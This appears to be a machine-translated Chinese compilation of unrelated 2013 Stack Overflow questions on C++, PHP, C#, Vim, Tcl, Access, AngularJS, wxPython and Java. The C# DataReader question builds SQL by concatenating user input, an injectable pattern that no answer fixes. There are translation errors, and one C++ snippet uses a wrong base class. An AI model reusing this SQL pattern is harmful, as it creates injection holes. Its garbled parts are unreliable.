> 标签：c++, enums

**我在某些A**类的公共部分有枚举。我想在**B**类中使用这个枚举。是否可以在不指定 *A::enum_value* 的情况下使其可访问？所以我可以只使用 *enum_value*。

```
using A::enumname; 
```

*B*类内部无法编译。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-12T14:14:14.917

```
If you only need certain values, you can do:

struct B {
  static const A::enumname 
    enum_value1 = A::enum_value1,
    enum_value2 = A::enum_value2;  // etc.
}; 
```

如果可以修改 A，则可以将枚举提取到 A 和 B 都可以使用的基类中：

```
struct AEnum {
  enum enumname { enum_value1, enum_value2 };
};

struct A : AEnum {
};

struct B : BEnum {
}; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T14:17:55.547

没有直接将所有枚举值从一个地方导入到另一个地方的好方法。在这种情况下，我建议将`A`'s enum 包装到一个嵌套类中，然后将其键入*到*`B`.

例如：

```
class A
{
public:
    struct UsefulEnumName
    {
        enum Type { BAR };
    };
};

class B
{
    typedef A::UsefulEnumName UsefulEnumName;
    UsefulEnumName::Type foo() const { return UsefulEnumName::BAR; }
}; 
```

# php - 警告：session_start() [function.session-start]

> ID：15973533
> 
> 赞同：0
> 
> 时间：2013-04-12T14:09:24.383
> 
> 标签：php, session

> 警告：session_start() [function.session-start]：无法发送会话缓存限制器 - 标头已在第 2 行发送

我搜索了每一个问题。我看到解决方案将其放在页面顶部。

我做了：

```
<?php session_start();?> 
```

得到同样的错误。有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:10:44.497

> 无法发送会话缓存限制器 - 标头已发送

总是意味着您之前已经打印了一些内容。检查是否没有 HTML 代码或任何其他回显文本。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:21:05.930

您应该对自己慷慨，并提供输出开始的信息：

```
<?php    

if (headers_sent($filename, $linenum)) {
    trigger_error("Headers already sent in $filename on line $linenum", E_USER_ERROR);
} 

session_start();

?> 
```

这应该为您提供更多信息，以便更轻松地解决问题。

对于该错误消息，有关 Stackoverflow 的最佳书籍是：

*   [PHP 已发送的标头](https://stackoverflow.com/questions/8028957/headers-already-sent-by-php)

# c# - 数据读取器慢

> ID：15973535
> 
> 赞同：0
> 
> 时间：2013-04-12T14:09:28.103
> 
> 标签：c#, data-binding, ado.net

我有一个`DataReader`填充 a `GridView`，但它非常慢。

我加载了 5000 行。当我使用 SSMS 在 SQL 上运行查询时，它在 1-5 秒内完成，但使用浏览器需要 30-45 秒：/

我怎样才能改进它以更快？

我的代码：

```
public SqlDataReader MostraVistoriaOpereracionalAdmin(String data1, String data2, string todos)
{
    conn.Open();
    string sql = "SELECT CONVERT(VARCHAR(10), data, 103) AS 'Data', " +
    "motorista AS 'Motorista', "+
    "ajudante1 AS 'Ajudante I', "+
    "ajudante2 AS 'Ajudante II', "+
    "CASE WHEN os = 0 THEN 'Não' WHEN os = 1 THEN 'Sim' END AS' OS ', "+
    "CASE WHEN mtr = 0 THEN 'Não' WHEN mtr = 1 THEN 'Sim' END AS 'MTR', "+
    "CASE WHEN roteiro = 0 THEN 'Não' WHEN roteiro = 1 THEN 'Sim' END AS 'Roteiro', "+
    "CASE WHEN final = 0 THEN 'Não' WHEN final = 1 THEN 'Sim' END AS 'Dest. Final', "+
    "os  * -1 + mtr * -5 + roteiro * -3 + final * -10000 AS 'pontos', "+ // Faz o calculo da pontuação
    "gravado_por AS 'Gravado Por', "+
    "gravado_em AS 'Gravado Em' " +
    "FROM tbl_vistoria WHERE data BETWEEN '"+data1+"' AND '"+data2+"'";

    if (todos != "TODOS")
    {
        sql += " AND (motorista = '"+todos+"' OR ajudante1 = '"+todos+"' OR ajudante2 = '"+todos+"')";
    }

    sql += "ORDER BY tbl_vistoria.data";

    command = new SqlCommand(sql, conn);
    dataReader = command.ExecuteReader();
    return dataReader;

} 
```

我在`Button`. 它调用`DataReader`：

```
VistoriaDB vistoriaDB = new VistoriaDB();
grvOperacional.DataSource = vistoriaDB.MostraVistoriaOpereracionalAdmin(d1, d2, funcionario);
grvOperacional.DataBind(); 
```

# c# - 序列化错误：存在反映类型的错误

> ID：15973542
> 
> 赞同：2
> 
> 时间：2013-04-12T14:09:48.230
> 
> 标签：c#, serialization

我有两个班级：`ServiceTrigger`和`ServiceCalendar`。

当我序列化`model.Triggers`时，我收到一个异常消息：

> 无法序列化类型为
> 'System.Collections.Generic.IEnumerable`1[[yyyy.ServiceCalendar, yyy.ChangeAD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null]]' 的成员 'yyy.ServiceTrigger.ServiceDaysOfWeek'，
> 请参阅内部异常了解更多详情。"}

我创建了一个`IEnumerable<ServiceTrigger>`：

```
IEnumerable<ServiceTrigger> serviceTriggers = model.Triggers;
XDocument xDoc = SerializationUtil.Serialize(model.Triggers); 
```

头等舱是这样的：

```
[DataContract]
public class ServiceTrigger
{   
    [DataMember(Name = "triggerID")]
    public long TriggerID { get; set; }

    [DataMember(Name = "name")]
    public string Name { get; set; }

    [DataMember(Name = "dateStart")]
    public string DateStart { get; set; }

    [DataMember(Name = "code")]
    public string Code { get; set; }

    [DataMember(Name = "isActive")]
    public bool IsActive { get; set; }

    [DataMember(Name = "dateFrom")]
    public string DateFrom { get; set; }

    [DataMember(Name = "dateTo")]
    public string DateTo { get; set; }  

    [DataMember(Name = "currentState")]
    public string CurrentState { get; set; }

    [DataMember(Name = "daysOfWeek")]
    public IEnumerable<ServiceCalendar> ServiceDaysOfWeek { get; set; } 

    [DataMember(Name = "monthsOfYear")]
    public IEnumerable<ServiceCalendar> MonthsOfYear { get; set; }

    [DataMember(Name = "daysOfMonth")]
    public IEnumerable<ServiceCalendar> DaysOfMonth { get; set; } 
} 
```

二等舱是这样的：

```
[DataContract]
public class Calendar
{
    [DataMember(Name = "id")]
    public int Id { get; set; }

    [DataMember(Name = "name")]
    public string Name { get; set; }

    [DataMember(Name = "code")]
    public string Code { get; set; }

    [DataMember(Name = "isActive")]
    public bool IsActive { get; set; }
) 
```

我的序列化类是这样的：

```
public static class SerializationUtil
{
    public static T Deserialize<T>(XDocument doc)
    {
        XmlSerializer xmlSerializer = new XmlSerializer(typeof(T));

        using (var reader = doc.Root.CreateReader())
        {
            return (T)xmlSerializer.Deserialize(reader);
        }
    }

    public static XDocument Serialize(this object obj)
    {
        XmlSerializer xmlSerializer = new XmlSerializer(obj.GetType());

        XDocument doc = new XDocument();
        using (var writer = doc.CreateWriter())
        {
            xmlSerializer.Serialize(writer, obj);
        }

        return doc;
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-12T14:23:23.600

您不能序列化接口。您需要使用实际对象，例如`List<ServiceCalendar>`.

另请注意，`ServiceCalendar`需要一个*不带*参数的默认构造函数，以便`XmlSerializer`在反序列化时创建它。这仅在您添加带有参数的自定义构造函数时才重要。如果您根本没有构造函数，则默认构造函数已经存在。

例子：

```
public class ServiceCalendar {
    // this is required for deserialization if a .ctor with parameters is present.
    public ServiceCalendar() { }

    public ServiceCalendar(int id) {
        this.id = id;
    }
} 
```

否则你会得到一个类似的异常

> 没有为*ServiceCalendar类型定义无参数构造函数*

# video-streaming - 使用 VLC 流式传输多个频道

> ID：15973543
> 
> 赞同：-1
> 
> 时间：2013-04-12T14:09:49.273
> 
> 标签：video-streaming, vlc

我有一个 DVB-T 棒，我可以使用 VLC 流式传输频道，然后在我的 LAN 上的另一台计算机上访问它。现在我希望我的 VLC（在服务器上）可以在服务器的不同端口上使用同一个 DVB-T Stick 流式传输不同的频道。在客户端，当用户更改端口号时，他们将能够访问不同的通道。我多次尝试实现此功能（通过运行多个 VLC 实例并更改服务器上的频率和端口号），但它不允许我使用一个 DVB-Stick 同时运行两个 VLC。请指导我如何实现此功能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T14:18:03.147

您需要尽可能多的接收器来同时查看流。我知道有些机顶盒有两个接收器，这样你就可以看两个流画中画或一边看另一个流一边录制一个流，但我不知道 U 盘。即使有带有多个接收器的 USB 记忆棒，我也非常怀疑它们会有两个以上。

因此，每个流都需要一个接收器，这可能意味着每个流需要一个 U 盘。

# vim - 继续最后的 VIM 语法高亮，直到出现新的关键字？

> ID：15973544
> 
> 赞同：2
> 
> 时间：2013-04-12T14:09:50.400
> 
> 标签：vim, syntax-highlighting

我正在尝试为日志文件编写自定义语法突出显示。每个日志行都以定义明确的标题开头，例如：

```
TRACE: text text text
DEBUG: text text text 
```

TRACE 和 DEBUG 行将有不同的颜色，例如：

```
:syn match logTrace "^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|TRACE|.*"
:syn match logDebug "^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|DEBUG|.*"

hi def logTrace ctermfg=darkgray
hi def logDebug ctermfg=lightgray 
```

问题是在某些情况下日志条目会跨越多行，例如：

```
TRACE: Here's a list of files:
file1.ext
file2.ext
file3.ext
DEBUG: text text text 
```

因此我的问题是：有什么方法可以告诉语法高亮引擎继续使用与最后检测到的行（上例中的 TRACE 行）相同的颜色为未识别的行（例如上例中的 file1.ext）着色)?

谢谢你。

* * *

## **编辑：**

上面的例子是一个简化的例子。我的日志实际上还包含 INFO、ERROR、EXCEPTION 和 FATAL 日志类型，并且每一行都以时间戳开头。日志行看起来像这样：

```
2013-04-11 13:36:05|TRACE|texttexttexttexttext
2013-04-11 13:36:07|INFO|texttexttexttexttexttext
another line
another line
2013-04-11 13:36:10|DEBUG|texttexttexttext
2013-04-11 13:36:10|ERROR|texttexttexttexttexttext
another line
another line
another line
2013-04-11 13:36:10|DEBUG|texttexttexttext 
```

**我最终实现了 Ineo 的区域理念。这是它的外观：**

```
:syn region logTrace start=+^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|TRACE|+ end=+^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|+me=e-22
:syn region logDebug start=+^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|DEBUG|+ end=+^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|+me=e-22
:syn region logInfo start=+^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|INFO|+ end=+^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|+me=e-22
:syn region logError start=+^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|ERROR|+ end=+^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|+me=e-22
:syn region logException start=+^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|EXCEPTION|+ end=+^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|+me=e-22
:syn region logFatal start=+^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|FATAL|+ end=+^\d\{4}-\d\{2}-\d\{2} \d\{2}:\d\{2}:\d\{2}|+me=e-22 
```

*   虽然它看起来有点乱——它工作得很好（我宁愿将日期/时间模式表示为一个变量，但目前这超出了我的 VIM 技能）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:44:35.307

如果您只有两个组 ( `DEBUG and TRACE`)，您可以

```
hi def logDebug ctermfg=yellow
hi def logTrace ctermfg=green
syn match logTrace "^\zsTRACE:\_.\{-}\ze\_^DEBUG:"
syn match logDebug "^\zsDEBUG:\_.\{-}\ze\_^TRACE:" 
```

注意我改变了颜色，还有时间戳/日期匹配，只是为了展示这个想法，你可以添加它。

如果您有更多组......并且所有组都以时间戳开头。您只需检查时间戳而不是`TRACE/DEBUG/INFO/WARN/...`之后`\ze`。在这里您可以在一个组中制作密钥，并引用它..

好的，它看起来像： ![在此处输入图像描述](https://i.stack.imgur.com/S9Q5X.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-12T14:48:32.177

没有“在下一个语法组之前继续着色”的概念；您需要将附加行包含到您的语法组中。

为此，有两种可能性：

1.  扩展`:syn match`以包含*不*以您的时间戳/关键字之一开头的其他行。
2.  切换到`:syn region`并使该区域在日志行的下一个开始处结束，减去一行（使用 a`:help :syn-pattern-offset`表示），或在文件的末尾。

# tcl - 如何在没有 fileevent 的情况下将长时间运行的程序的输出发送到 tcl 中的标准输出？

> ID：15973548
> 
> 赞同：0
> 
> 时间：2013-04-12T14:09:55.900
> 
> 标签：tcl

我需要从 Tcl 中长时间运行的外部程序收集输出。我不能使用 exec，因为这会阻塞，直到其他程序完成。所以，我想我应该打开一个管道：

```
set pipe [open "|long_running_program" "r"] 
```

但是我不清楚如何将输出发送到标准输出。我使用的是纯 Tcl，没有事件循环，所以我不能使用 fileevent。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:27:22.117

您应该做的是将管道置于非阻塞模式。然后，您可以使用`read`获取管道上当前可用的所有内容，准备传输到标准输出。但是，您需要自己弄清楚何时寻找输出；该`fileevent`命令是 Tcl 的解决方案，但这需要使用事件循环。`update`（当然，您可以通过or启动一个临时`vwait`的；使用 tclsh 并不意味着没有事件循环，而只是意味着没有*默认*的事件循环。）

```
fconfigure $pipe -blocking 0

set data [read $pipe]
if {[eof $pipe]} {
    # Other side is finished; close the pipe?
} elseif {[fblocked $pipe]} {
    # No data available right now; try later
} else {
    # Print to stdout; use the newlines already in the data
    puts -nonewline $data
} 
```

您还应该知道，许多程序仅在写入管道时才以突发方式传递数据。他们根据是写入管道还是终端来*改变他们的行为。*这可能很重要，特别是如果您正在执行命令自动化；如果它对你有用，你最好的选择是 Expect 扩展包。

# vba - 在 Access 2007 中，是否可以循环访问自定义类别中的项目？

> ID：15973549
> 
> 赞同：3
> 
> 时间：2013-04-12T14:09:56.277
> 
> 标签：vba, ms-access

在 Access 2007 的导航窗格中，我们有“自定义”类别，可以创建自定义类别、为其命名、添加表格、查询等。VBA 是否可以循环访问自定义类别中的所有项目？

例如，我创建了一个名为“Validations”的类别，它包含 5 个查询。我想遍历每个查询并运行它。在伪代码中，它看起来像这样：

```
For Each Query in Validations
    DoCmd.OpenQuery "Query" 
```

编辑：我开始研究它，看起来我需要访问 MSysNavPaneGroups 表来获取我的自定义组的 ID。在我的情况下，ID = 235

此外，是否可以在此过程中创建 Excel 电子表格，如果查询返回 >0 行，是否将这些行粘贴到 Sheet1、Sheet2 等？就像是：

```
Count = 1

For Each Query in Validations
    DoCmd.OpenQuery "Query"
    If Query.Rows > 0
        Excel.Sheet(i).Name = Query.Name
        Excel.Sheet(i).Rows = Query.Rows
        Count = Count + 1
    End If 
```

我自己什至还没有开始研究 Excel 部分，所以如果你不想弄乱它也没关系。我更关心遍历自定义类别中的查询。

一如既往，谢谢！

编辑：我使用下面的 Gord 的 SQL 创建了一个名为“GetValidationNames”的查询：

```
SELECT MSysNavPaneGroups.Name AS GroupName, MSysNavPaneGroupToObjects.Name AS ObjectName
FROM MSysNavPaneGroups INNER JOIN MSysNavPaneGroupToObjects 
    ON MSysNavPaneGroups.Id = MSysNavPaneGroupToObjects.GroupID
WHERE (((MSysNavPaneGroups.GroupCategoryID)=3))
ORDER BY MSysNavPaneGroups.Name, MSysNavPaneGroupToObjects.Name; 
```

然后创建了一个带有按钮的表单，并在 Button_Click() 中添加了以下内容：

```
Dim rs as Recordset
Set rs = CurrentDb.OpenRecordset("GetValidationNames")

Do While Not rs.EOF
    DoCmd.TransferSpreadsheet acExport, acSpreadsheetTypeExcel12, rs("ObjectName"), _
        "C:\users\username\Desktop\ValidationResults.xlsx"
    rs.MoveNext
Loop 
```

这会运行所有查询，并将每个查询作为新选项卡添加到现有 Excel 文件“ValidationResults.xlsx”中

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-12T14:40:36.820

我只是把它煮熟了，所以我没有给它任何严格的测试，但它似乎列出了分配给自定义类别的所有对象

```
SELECT MSysNavPaneGroups.Name AS GroupName, MSysNavPaneGroupToObjects.Name AS ObjectName
FROM MSysNavPaneGroups INNER JOIN MSysNavPaneGroupToObjects 
    ON MSysNavPaneGroups.Id = MSysNavPaneGroupToObjects.GroupID
WHERE (((MSysNavPaneGroups.GroupCategoryID)=3))
ORDER BY MSysNavPaneGroups.Name, MSysNavPaneGroupToObjects.Name; 
```

如果一个类别包含多于一种类型的对象（例如，表和查询），它可能会扩展为返回对象类型。

# javascript - 当 ID 转到具有相同 ID 的 url 时，Angular $routeProvide

> ID：15973550
> 
> 赞同：0
> 
> 时间：2013-04-12T14:10:04.080
> 
> 标签：javascript, angularjs

如何使它工作...

```
app.config(['$routeProvider', function($routeProvider) {
    $routeProvider.
        when('/show/:id', {templateUrl: '/show/$ID',  controller:'User'}).

    otherwise({redirectTo: '/'});
}]); 
```

**将$ID**更改为**:id**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T16:48:38.597

复制。在此处查看我的答案： [AngularJS - 如何在生成 templateUrl 时使用 $routeParams？](https://stackoverflow.com/questions/11534710/angularjs-how-to-use-routeparams-in-generating-the-templateurl/15817458#15817458)

```
var app = angular.module('app',[]);

app.config(
    function($routeProvider) {
        $routeProvider.
            when('/', {templateUrl:'/home'}).
            when('/users/:user_id', 
                {   
                    controller:UserView, 
                    templateUrl: function(params){ return '/users/view/' + params.user_id; }
                }
            ).
            otherwise({redirectTo:'/'});
    }
); 
```

# wxpython - wxpython，打开文件并将文本显示到 textctrl 区域

> ID：15973566
> 
> 赞同：0
> 
> 时间：2013-04-12T14:10:42.423
> 
> 标签：wxpython

wxpython 很新，所以我正在努力解决这个问题。在教程和尝试学习的帮助下，我有了一点方法。

我的文件菜单中有一个“打开”，我正在尝试获取它，以便当我打开文件时，文件中的文本将显示在我的多行 textctrl 框中

我尝试了一些位，例如 WriteText() 和 SetValue()，但无法显示。

```
import wx
import os

class MainWindow(wx.Frame):
def __init__(self, parent, title):
    self.dirname=''
    super(MainWindow, self).__init__(parent, title=title, size=(450, 450))
    self.CreateStatusBar() # A Statusbar in the bottom of the window
    global urlFld

    self.InitGUI()
    self.Centre()
    self.Show()

def InitGUI(self):

    #MENUS
    fileMenu = wx.Menu()  #create menu for file
    viewMenu = wx.Menu()  #create a menu for view
    helpMenu = wx.Menu()  #create a menu for help

    #FILE MENU
    menuOpen = fileMenu.Append(wx.ID_OPEN, "&Open"," Open a file to edit")  #add open to File
    menuExit = fileMenu.Append(wx.ID_EXIT, "E&xit"," Terminate the program")  #add exit to File

    #VIEW MENU
    menuView = viewMenu.Append(wx.ID_ANY, "TODO:", "Still to do")

    #HELP MENU
    menuAbout = helpMenu.Append(wx.ID_ABOUT, "&About", "About this program")  #add about menu item

    #MENUBAR
    menuBar = wx.MenuBar()
    menuBar.Append(fileMenu,"&File") # Adding the "filemenu" to the MenuBar
    menuBar.Append(viewMenu, "&View")
    menuBar.Append(helpMenu, "&Help")
    self.SetMenuBar(menuBar)  # Adding the MenuBar to the Frame content.

    '''#TOOLBAR
    toolbar = self.CreateToolBar()
    toolOpen = toolbar.AddLabelTool(wx.ID_OPEN, "Open", wx.Bitmap("open.png"))
    toolExit = toolbar.AddLabelTool(wx.ID_EXIT, "Exit", wx.Bitmap("blah.png"))'''

    #MENU EVENTS
    self.Bind(wx.EVT_MENU, self.OnOpen, menuOpen)
    self.Bind(wx.EVT_MENU, self.OnAbout, menuAbout)
    self.Bind(wx.EVT_MENU, self.OnExit, menuExit)

    '''#TOOLBAR EVENTS
    self.Bind(wx.EVT_TOOL, self.OnExit, toolExit)
    self.Bind(wx.EVT_TOOL, self.OnOpen, toolOpen)'''

    #PANEL
    panel = wx.Panel(self)

    panel.SetBackgroundColour('#ededed')
    vBox = wx.BoxSizer(wx.VERTICAL)

    hBox = wx.BoxSizer(wx.HORIZONTAL)
    hBox.Add(wx.StaticText(panel, label="File:"), flag=wx.TOP, border=3)
    hBox.Add(wx.TextCtrl(panel), 1, flag=wx.LEFT, border=10)
    checkBtn = wx.Button(panel, -1, "Check")
    self.Bind(wx.EVT_BUTTON, self.checkBtnClick)
    hBox.Add(checkBtn, 0, flag=wx.LEFT, border=10)
    vBox.Add(hBox, flag=wx.EXPAND|wx.LEFT|wx.RIGHT|wx.TOP, border=10)
    vBox.Add((-1, 10))

    hBox2 = wx.BoxSizer(wx.HORIZONTAL)
    hBox2.Add(wx.StaticText(panel, label="URLs:"))
    vBox.Add(hBox2, flag=wx.LEFT, border=10)
    vBox.Add((-1, 5))

    hBox3 = wx.BoxSizer(wx.HORIZONTAL)
    urlFld = wx.TextCtrl(panel, style=wx.TE_MULTILINE, size=(-1,295))
    hBox3.Add(urlFld, 1, flag=wx.EXPAND)
    vBox.Add(hBox3, flag=wx.EXPAND|wx.LEFT|wx.RIGHT, border=10)

    panel.SetSizer(vBox)

#GUI EVENTS
def checkBtnClick(self, e):
    urlFld.SetValue(self, "blahh")

#MENU ITEM EVENTS
def OnAbout(self,e):
    dlg = wx.MessageDialog(self, "A small text editor", "My test editor", wx.OK)  #create a dialog (dlg) box to display the message, and ok button
    dlg.ShowModal()  #show the dialog box, modal means cannot do anything on the program until clicks ok or cancel
    dlg.Destroy()  #destroy the dialog box when its not needed

def OnExit(self,e):
    self.Close(True)  #on menu item select, close the app frame.

def OnOpen(self,e):
    self.dirname=""  #set directory name to blank
    dlg = wx.FileDialog(self, "Choose a file to open", self.dirname, "", "*.*", wx.OPEN) #open the dialog boxto open file
    if dlg.ShowModal() == wx.ID_OK:  #if positive button selected....
        self.filename = dlg.GetFilename()  #get the filename of the file
        self.dirname = dlg.GetDirectory()  #get the directory of where file is located
        f = open(os.path.join(self.dirname, self.filename), 'r')  #traverse the file directory and find filename in the OS
        text = f.read()
        self.urlFld.SetValue(f.read())  #open the file from location as read
        self.urlFld.WriteText(text)
        f.close
    dlg.Destroy()

app = wx.App(False)   #creates a new app
MainWindow(None, "URL Checker")  #give the frame a title
app.MainLoop()  #start the apps mainloop which handles app events 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-12T14:35:50.393

`urlFld`应该是类的属性：

```
# 'self' added
self.urlFld = wx.TextCtrl(panel, style=wx.TE_MULTILINE, size=(-1,295)) 
```

而不是局部变量，以便您可以在方法之外引用它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-12T14:40:18.790

不要使用全局变量使用 self 代替这里是修改后的代码

```
import wx
import os

class MainWindow(wx.Frame):
    def __init__(self, parent, title):
        self.dirname = ''
        super(MainWindow, self).__init__(parent, title=title, size=(450, 450))
        self.CreateStatusBar()  # A Statusbar in the bottom of the window

        self.InitGUI()
        self.Centre()
        self.Show()

    def InitGUI(self):

        # MENUS
        fileMenu = wx.Menu()  # create menu for file
        viewMenu = wx.Menu()  # create a menu for view
        helpMenu = wx.Menu()  # create a menu for help

        # FILE MENU
        menuOpen = fileMenu.Append(wx.ID_OPEN,
                        "&Open", " Open a file to edit")  # add open to File
        menuExit = fileMenu.Append(wx.ID_EXIT, "E&xit",
                                " Terminate the program")  # add exit to File

        # VIEW MENU
        menuView = viewMenu.Append(wx.ID_ANY, "TODO:", "Still to do")

        # HELP MENU
        menuAbout = helpMenu.Append(wx.ID_ABOUT, "&About",
                                "About this program")  # add about menu item

        # MENUBAR
        menuBar = wx.MenuBar()
        menuBar.Append(fileMenu, "&File")  # Adding the "filemenu" to the MenuBar
        menuBar.Append(viewMenu, "&View")
        menuBar.Append(helpMenu, "&Help")
        self.SetMenuBar(menuBar)  # Adding the MenuBar to the Frame content.

        '''#TOOLBAR
        toolbar = self.CreateToolBar()
        toolOpen = toolbar.AddLabelTool(wx.ID_OPEN, "Open", wx.Bitmap("open.png"))
        toolExit = toolbar.AddLabelTool(wx.ID_EXIT, "Exit", wx.Bitmap("blah.png"))'''

        # MENU EVENTS
        self.Bind(wx.EVT_MENU, self.OnOpen, menuOpen)
        self.Bind(wx.EVT_MENU, self.OnAbout, menuAbout)
        self.Bind(wx.EVT_MENU, self.OnExit, menuExit)

        '''#TOOLBAR EVENTS
        self.Bind(wx.EVT_TOOL, self.OnExit, toolExit)
        self.Bind(wx.EVT_TOOL, self.OnOpen, toolOpen)'''

        # PANEL
        panel = wx.Panel(self)

        panel.SetBackgroundColour('#ededed')
        vBox = wx.BoxSizer(wx.VERTICAL)

        hBox = wx.BoxSizer(wx.HORIZONTAL)
        hBox.Add(wx.StaticText(panel, label="File:"), flag=wx.TOP, border=3)
        hBox.Add(wx.TextCtrl(panel), 1, flag=wx.LEFT, border=10)
        checkBtn = wx.Button(panel, -1, "Check")
        self.Bind(wx.EVT_BUTTON, self.checkBtnClick)
        hBox.Add(checkBtn, 0, flag=wx.LEFT, border=10)
        vBox.Add(hBox, flag=wx.EXPAND | wx.LEFT | wx.RIGHT | wx.TOP, border=10)
        vBox.Add((-1, 10))

        hBox2 = wx.BoxSizer(wx.HORIZONTAL)
        hBox2.Add(wx.StaticText(panel, label="URLs:"))
        vBox.Add(hBox2, flag=wx.LEFT, border=10)
        vBox.Add((-1, 5))

        hBox3 = wx.BoxSizer(wx.HORIZONTAL)
        self.urlFld = wx.TextCtrl(panel, style=wx.TE_MULTILINE, size=(-1, 295))
        hBox3.Add(self.urlFld, 1, flag=wx.EXPAND)
        vBox.Add(hBox3, flag=wx.EXPAND | wx.LEFT | wx.RIGHT, border=10)

        panel.SetSizer(vBox)

    # GUI EVENTS
    def checkBtnClick(self, e):
        self.urlFld.SetValue("blahh")

    # MENU ITEM EVENTS
    def OnAbout(self, e):
        dlg = wx.MessageDialog(self, "A small text editor",
                               "My test editor", wx.OK)  # create a dialog (dlg) box to display the message, and ok button
        dlg.ShowModal()  # show the dialog box, modal means cannot do anything on the program until clicks ok or cancel
        dlg.Destroy()  # destroy the dialog box when its not needed

    def OnExit(self, e):
        self.Close(True)  # on menu item select, close the app frame.

    def OnOpen(self, e):
        self.file_open()
        e.Skip()

    def file_open(self):  # 9
        with wx.FileDialog(self, "Choose a file to open", self.dirname,
                           "", "*.*", wx.OPEN) as dlg:
            if dlg.ShowModal() == wx.ID_OK:
                directory, filename = dlg.GetDirectory(), dlg.GetFilename()
                self.urlFld.LoadFile('/'.join((directory, filename)))
                self.SetTitle(filename)

app = wx.App(False)  # creates a new app
MainWindow(None, "URL Checker")  # give the frame a title
app.MainLoop()  # start the apps mainloop which handles app events 
```

# java - How can I create a variable name from a String?

> ID：15973567
> 
> 赞同：0
> 
> 时间：2013-04-12T14:10:42.763
> 
> 标签：java, variables, recursion, while-loop

I am making lots of variables but I want to do this through a while statement.

The problem is that I cannot figure out how to use a variable as part of a variable name so that the variable being created in the loop id not created multiple times (and hence causing an error).

I have a loop like this:

```
int index = 0
while (index < 10){
    JLabel A1 = new JLabel("A" + [index]);
    index++;
} 
```

Obviously I do not want all my variables called A1 as this isn't legal syntax. How do I have it so that my variables will be A[index]?

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-12T14:12:16.080

You don't, basically. Variable names are defined at *compile-time*.

You either want some sort of index-based collection (array, list) or a string-keyed collection (e.g. a `HashMap<String, JLabel>`).

If you *only* want to access by index and you don't need to add items later, then just use an array:

```
JLabel[] labels = new JLabel[10];
for (int i = 0; i < labels.length; i++) {
    labels[i] = new JLabel("A" + i);
} 
```

Or for a list:

```
List<JLabel> labels = new ArrayList<JLabel>();
for (int i = 0; i < 10; i++) {
    labels.add(new JLabel("A" + i));
} 
```

# javascript - 如何将其从 jQuery 移植到 AngularJS

> ID：15973569
> 
> 赞同：1
> 
> 时间：2013-04-12T14:10:51.393
> 
> 标签：javascript, jquery, angularjs

我正在做一个人工智能项目。我在网页上有一个小坦克和一个网格，坦克只是一个像这样的 div：

```
<div id="agent" ></div> 
```

然后我使用 jQuery 来做这样的事情：

```
agent = $('#agent').setUpAgent();

//examples of usage:
agent.goUp();
agent.goLeft();
agent.doActions['left','right','down']; // (will execute: goLeft, goRight, goDown functions. 
```

这些方法的实现相当简单：

```
Agent.prototype.goLeft = function() {
    this.agentDiv.rotate(45); // rotate the jQuery-wrapped div
    this.agentDiv.animate({"margin-left": "-=51px"}, "slow"); //51 is the step size
} 
```

如您所见，代理上的移动是通过 jQueryAnimate 更改其边距来实现的。将其移植到 angularJS 是否合乎逻辑？例如像这样：

```
<div agent="nameOfJavascriptObject" ></div> 
```

由于 AngularJS 会通过设置手表自动更新我的视图，我应该如何处理呢？我是否应该有一个带有“actionsToBeExecuted”的模型对象，并且当它不为空时我触发“goUp()、goLeft()...”等函数？我怎样才能使它改变时触发功能？我不知道如何移植它，甚至是否应该移植它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-15T01:35:59.930

这是一个简单的例子，你可以如何做到这一点：

[http://plnkr.co/edit/7wG08Twvt7jufIpvjHFl?p=preview](http://plnkr.co/edit/7wG08Twvt7jufIpvjHFl?p=preview)

您可以使用 javascript 对象简单地表达代理的外观属性（例如位置、角度）并对其进行操作。

在指令中，将该对象绑定到范围和`$watch`外观属性中，并根据属性的变化方式进行动画处理。（例如，如果`angle`更改然后调用`rotate()`）

# javascript - IE6 调试 JavaScript

> ID：15973578
> 
> 赞同：0
> 
> 时间：2013-04-12T14:11:05.817
> 
> 标签：javascript, debugging, internet-explorer-6

我知道有人问过，但这在 IE6 (winxp) 中很奇怪。

JS 代码在某些时候崩溃：

```
var result = ....
if(result==200) <-- this is the reported error in IE6, something at line 62 char 5 
```

它在最新的 Chrome、Firefox 等中运行良好。

你能告诉我一些 IE6 的工具，比如 FireBug 插件（或其他东西）来捕捉这个吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T15:09:33.583

也许这可以帮助你：[https ://getfirebug.com/firebuglite](https://getfirebug.com/firebuglite)

